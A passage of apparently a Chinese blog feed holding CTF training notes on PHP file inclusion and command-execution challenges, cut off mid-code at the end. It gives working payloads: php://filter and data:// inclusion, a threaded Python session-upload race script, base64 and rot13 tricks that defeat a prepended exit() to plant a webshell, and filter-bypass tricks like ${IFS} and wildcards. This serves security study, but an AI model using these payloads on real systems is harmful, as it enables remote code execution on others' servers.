    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>?file=php://filter/read=convert.base64-encode/resource=flag.php</p><p>?file=data://text/plain,&lt;?php system(‘tac flag.php’);?&gt;</p><p>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</p></blockquote><ul><li>日志包含</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819110931740.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819111129373.png"></p><ul><li>session 文件竞争包含</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>点被过滤了，就不能包含日志文件了</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210822104732779.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210822104757678.png"></p><p>此时用户是可以自己定义 Session ID 的。比如，我们在<code>Cookie</code>里设置<code>PHPSESSID=flag</code>，PHP 将会在服务器上创建一个文件：<code>/tmp/sess_flag</code>。即使此时用户没有初始化 Session，PHP 也会自动初始化 Session,并产生一个键值。在 Linux 系统中，session 文件一般的默认存储位置为 <code>/tmp</code>或<code>/var/lib/php/session</code></p><p>但是<strong>session.upload_progress.cleanup 默认是开启的，一旦读取了所有 POST 数据，它就会清除进度信息</strong></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210822124557917.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;地址&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span></span><br><span class="hljs-tag">        <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;change here&quot;</span></span><br><span class="hljs-tag">      /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>抓包，添加<code>Cookie: PHPSESSID=flag</code>，在<code>PHP_SESSION_UPLOAD_PROGRESS</code>下添加一句话木马。</p><p>PHP 将会在服务器上创建一个文件：<code>/tmp/sess_flag</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/1999159-20201011101000761-1649541695.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/1999159-20201010204012871-1202434485.png"></p><p>两者都重复发包即可，在得到<code>ls</code>的结果后，修改包再重复发包即可。</p><p>上面所谓的 payload 可加可不加，不加将攻击类型设置为 Null Payload 即可。</p><blockquote><p>当没有直接文件包含的点时，（比如文件上传漏洞，利用了 sess 上传进度，.user.ini/ini 包含的文件/ini 包含的文件包含 sess_flag）</p><p>python 通用脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br>sessID = <span class="hljs-string">&#x27;flag&#x27;</span><br>url = <span class="hljs-string">&#x27;http://761f62d0-9936-4b3c-be74-0b640259cea8.challenge.ctf.show:8080/&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">session</span>):</span><br>    <span class="hljs-keyword">while</span> event.isSet():<br>        f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">256</span> * <span class="hljs-number">1</span>)<span class="hljs-comment">#创建文件</span><br>        response = session.post(<span class="hljs-comment">#post上传</span><br>            url,<br>            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessID&#125;,<span class="hljs-comment">#设置cookie为sessid</span><br>            data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php system(&quot;nl ../*.php&quot;);?&gt;&#x27;</span>&#125;,<br>            files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;flag.txt&#x27;</span>, f)&#125;<span class="hljs-comment">#设置post具体内容，这里可以files=file</span><br>        )<br><br><span class="hljs-comment">#def read(session):</span><br><span class="hljs-comment">#    while event.isSet():</span><br><span class="hljs-comment">#        data =&#123;</span><br><span class="hljs-comment">#            &#x27;ctf&#x27;:&quot;/tmp/sess_&quot;+sessid   #包含我们的session路径</span><br><span class="hljs-comment">#        &#125;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">session</span>):</span><br>    <span class="hljs-keyword">while</span> event.isSet():<br>        response = session.get(url + <span class="hljs-string">&#x27;upload/index.php&#x27;</span>.<span class="hljs-built_in">format</span>(sessID)) <span class="hljs-comment">#获得相应包</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">print</span>(response.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*]retrying...&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<span class="hljs-comment">#条件竞争</span><br>    event = threading.Event()<br>    event.<span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>            threading.Thread(target=write, args=(session,)).start()<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>            threading.Thread(target=read, args=(session,)).start()<br><br></code></pre></td></tr></table></figure><p>当然也可以使用 bp 完成</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211005183417107.png"></p></blockquote><ul><li>死亡 exit</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    file_put_contents(urldecode(<span class="hljs-variable">$file</span>), <span class="hljs-string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="hljs-variable">$content</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>base64：</p><p>GET</p><p>url 全编码：php://filter/write=convert.base64-decode/resource=1.php</p><p>POST</p><p>base64：&lt;?php system(‘tac f*‘);?&gt;</p><p>==&gt; PD9waHAgc3lzdGVtKCd0YWMgZionKTs/Pg==</p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p>base64 编码中只包含 64 个可打印字符，而 PHP 在解码 base64 时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p><p>所以，一个正常的 base64_decode 实际上可以理解为如下两个步骤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>] = preg_replace(<span class="hljs-string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>]);<br>base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>所以，当<code>$content</code>被加上了<code>&lt;?php exit;?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符<code>&lt;</code> <code>?</code> <code>;</code> <code>&gt;</code> <code>空格</code>等一共有 7 个字符不符合 base64 编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p><p>“phpexit”一共 7 个字符，因为 base64 算法解码时是 4 个 byte 一组，所以给他增加 1 个“a”一共 8 个字符。这样，”phpexita”被正常解码，而后面我们传入的 webshell 的 base64 内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p></blockquote><p>==&gt; aaPD9waHAgc3lzdGVtKCd0YWMgZionKTs/Pg==</p><p>此处为&lt;?php die(‘大佬别秀了’);?&gt; ==&gt; phpdie 故前面添加两个字符</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210903001809220.png"></p><blockquote><p>rot13</p><p>GET</p><p>全编码：php://filter/write=string.rot13/resource=2.php</p><p>POST</p><p>&lt;?cuc flfgrz(‘gnp s*‘);?&gt;</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210903002413152.png"></p><blockquote><p>.htaccess 的预包含利用</p><p>同样使用过滤器，string.strip_tags</p><p>GET</p><p>全编码：php://filter/write=string.strip_tags|convert.base64-decode/resource=1.php</p><p>POST</p><p>base64：&lt;?php system(‘tac f*‘);</p><p>==&gt; PD9waHAgc3lzdGVtKCd0YWMgZionKTs=</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210904232700304.png"></p><p>string.strip_tags 可以在 php5 的环境下顺利的使用，如果题目环境是在 php7.3.0 以上的环境下，就会出现上面的情况，但此题是可以写进去的，访问 1.php 即可</p>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令执行</title>
    <link href="/2021/08/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2021/08/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="eval-c"><a href="#eval-c" class="headerlink" title="eval(c)"></a>eval(c)</h2><ul><li>从绕过正则匹配的角度：</li></ul><p>过滤了关键单词 如 flag、php 在 linux 可以使用占位符<code>？</code>和<code>*</code></p><p>比如<code>flag.php</code>可以使用<code>fl??.???</code>或者<code>fl?g.??p</code>和<code>f*</code>或者 <code>f***</code>等</p><p>也可以使用空字符<code>&#39;&#39;</code>夹在过滤内容之中<code>fl&#39;&#39;ag.php</code></p><p>还可以这样<code>fla\g.php</code>或者正则<code>f[abcd]ag.php</code>、<code>f[a-z]ag.php</code> <code>[abcd]</code> (<code>[abcd]</code> 匹配<code>abcd</code>中一个字符<code>[a-z]</code> 匹配范围 <code>a-z</code>)</p><p>payload 优先级<code>* = &#39;&#39; = \ &gt; ?</code></p><ul><li>从变量逃逸的角度</li></ul><p>对一个变量的正则过滤比较多的时候 可以对变量进行逃逸 比如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br> <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br> <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>     <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br> &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br> highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>?c=eval($_GET[‘a’]);&amp;a=system(‘ls’);</p></blockquote><p>这样就可以逃过对命令执行的单一变量过滤</p><ul><li>从函数特性的角度</li></ul><p>对于 eval 可以插入 php 的完整代码 因为 eval 会将字符串当作代码执行【include 见下文】</p><blockquote><p>?c=echo hello;?&gt;&lt;?=include($_GET[‘a’]);&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</p></blockquote><p>这里有两个疑问：</p><p>一、使用 echo file_get_contents(“flag.php”)并不能在页面直接显示出来 需要查看源码 为什么</p><p>二、使用 system(‘cat flag.php’)也需要查看源码 但是使用 system(‘tac flag.php’)就能直接得到源码(倒叙)</p><p>两个都是这样输出的</p><blockquote><?php......</blockquote><p>html 并不能这样直接输出 而倒叙的 tac 输出的则是</p><blockquote><p>……</p><?php</blockquote><p>其实这就涉及 html 页面的输出问题</p><ul><li>从语言结构的角度</li></ul><p>继续 但匹配再加一个括号<code>(</code>时 上面的方法就失效了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们仍然可以使用参数逃逸 （这里<code>;</code>被过滤了可以使用<code>?&gt;</code>代替）但是要用到语言结构 <code>echo print isset unset include require</code>等不需要使用括号</p><blockquote><p>?c=include$_GET[1];&amp;1=php://filter/read=convert.base64-encode/reasource=flag.php</p></blockquote><p>这里的 include 属于文件读取范畴 也就是说逃逸出去的参数 1 不能<code>1=system(ls)</code></p><blockquote><p>当正则匹配数字的时候 逃逸参数需要改为字母</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><ul><li>过滤了 system()</li></ul><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">system</span>()<br><span class="hljs-selector-tag">passthru</span>()    # <span class="hljs-selector-tag">passthru</span> — 执行外部程序并且显示原始输出<br><span class="hljs-selector-tag">exec</span>()        # <span class="hljs-selector-tag">exec</span> — 执行一个外部程序<br><span class="hljs-selector-tag">shell_exec</span>()  # <span class="hljs-selector-tag">shell_exec</span> — 通过 <span class="hljs-selector-tag">shell</span> 环境执行命令，并且将完整的输出以字符串的方式返回。<br><span class="hljs-selector-tag">popen</span>()<br><span class="hljs-selector-tag">proc_open</span>()<br><span class="hljs-selector-tag">pcntl_exec</span>()<br>` `           # 同<span class="hljs-selector-tag">shell_exec</span>()<br><br><span class="hljs-comment">//只有system函数是有回显的，其他的函数可以通过echo等显示</span><br></code></pre></td></tr></table></figure><ul><li>过滤了 cat</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs vim">more:一页一页的显示档案内容<br>les<span class="hljs-variable">s:</span>与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 <span class="hljs-keyword">cat</span> 的反向显示<br>tai<span class="hljs-variable">l:</span>查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br><span class="hljs-keyword">vi</span>:一种编辑器，这个也可以查看<br><span class="hljs-keyword">vim</span>:一种编辑器，这个也可以查看<br><span class="hljs-keyword">sor</span><span class="hljs-variable">t:</span>可以查看<br>uniq:可以查看<br><span class="hljs-keyword">file</span> -<span class="hljs-keyword">f</span>:报错出具体内容<br><span class="hljs-keyword">grep</span> 在当前目录中，查找后缀有 <span class="hljs-keyword">file</span> 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： <span class="hljs-keyword">grep</span> test *<span class="hljs-keyword">file</span><br>paste 指令会把每个文件以列对列的方式，一列列地加以合并。<br></code></pre></td></tr></table></figure><ul><li>过滤了空格</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$&#123;IFS&#125;</span><br><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9</span><br>&lt; <span class="hljs-regexp">//</span>某些情况tac&lt;fl?g.php不能出结果 应该是不支持通配符 情况有待证实<br>&lt;&gt;<br>&#123;a,b&#125; <span class="hljs-regexp">//</span>a,b都是shell命令<br>%<span class="hljs-number">09</span>(php)<br></code></pre></td></tr></table></figure><ul><li>无参数 RCE(Remote Command/Code Execute)</li></ul><p>Ⅰ</p><blockquote><p>show_source(next(array_reverse(scandir(pos(localeconv())))));</p><p>var_dump(file_get_contents(next(array_reverse(scandir(pos(localeconv()))))));</p><p>var_dump(file_get_contents(next(array_reverse(scandir(current(localeconv()))))));//pos 是 current 的别名</p></blockquote><p>Ⅱ</p><blockquote><p>?c=session_start();system(session_id());<br>修改 PHPSESSID 的值</p></blockquote><p>Ⅲ</p><blockquote><p>?c=print_r(get_defined_vars());//获得并打印所有变量</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210803142137477.png"></p><p>有 post 变量 传值进去</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210803142221361.png"></p><p>post 变量可控 我们先尝试定位到该 post 变量</p><p>数组操作：</p><p>post 变量位于第二</p><blockquote><p>?c=print(next(get_defined_vars()))</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210803142546722.png"></p><p>取出了该数组的键值对</p><p>取出值</p><blockquote><p>?c=print(array_pop(next(get_defined_vars())))</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210803142926765.png"></p><p>接着执行 RCE 即可</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210803143029652.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210803143059815.png"></p><ul><li>缓冲区清除</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = ob_get_contents();<br>        ob_end_clean();<br>        <span class="hljs-keyword">echo</span> preg_replace(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>获取缓冲区内容并且清除，然后把内容替换成<code>?</code></p><blockquote><p>?c=$it = new DirectoryIterator(“glob:///*”);foreach($it as $f) {echo$f-&gt;getFilename().”\n”;}die();</p></blockquote><p>UAF：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 